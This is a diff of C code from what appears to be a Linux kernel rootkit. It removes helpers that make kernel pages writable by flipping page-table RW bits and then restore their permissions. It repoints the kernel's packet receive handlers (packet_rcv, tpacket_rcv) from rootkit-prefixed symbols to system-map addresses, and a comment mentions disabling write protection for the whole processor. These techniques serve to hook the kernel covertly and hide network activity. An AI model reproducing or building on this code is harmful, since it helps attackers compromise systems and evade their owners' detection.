@@ -9,47 +9,9 @@
 #include "include.h"
 
 
-int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)      = (void*) rk_packet_rcv;
-int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void*) rk_packet_rcv_spkt;
-int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)     = (void*) rk_tpacket_rcv;
-
-unsigned long set_addr_rw(unsigned long addr)
-{
-  
-	printk("address = %ld\n", addr);	
-	if(addr < 0)
-	{
-		printk("address is negative"); 
-		return -EINVAL;
-	}
-
-  unsigned int level;
-  unsigned long result;
-
-  // Get the page table entry
-  pte_t* pte = lookup_address(addr, &level);
-
-  // Save the permissions
-  result = pte->pte;
-
-  // Set the new permissions
-  pte->pte |= _PAGE_RW;
-
-  return result;
-}
-
-// Restore page table permissions
-void set_pte_permissions(unsigned long addr, int perm)
-{
-  unsigned int level;
-
- 
-  // Get the page table entry
-  pte_t* pte = lookup_address(addr, &level);
-
-  // Set the new permissions
-  pte->pte = perm;
-}
+int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)      = (void*) sysmap_packet_rcv;
+int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void*) sysmap_packet_rcv_spkt;
+int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)     = (void*) sysmap_tpacket_rcv;
 
 /*
  * Disable the writing protection for the whole processor.
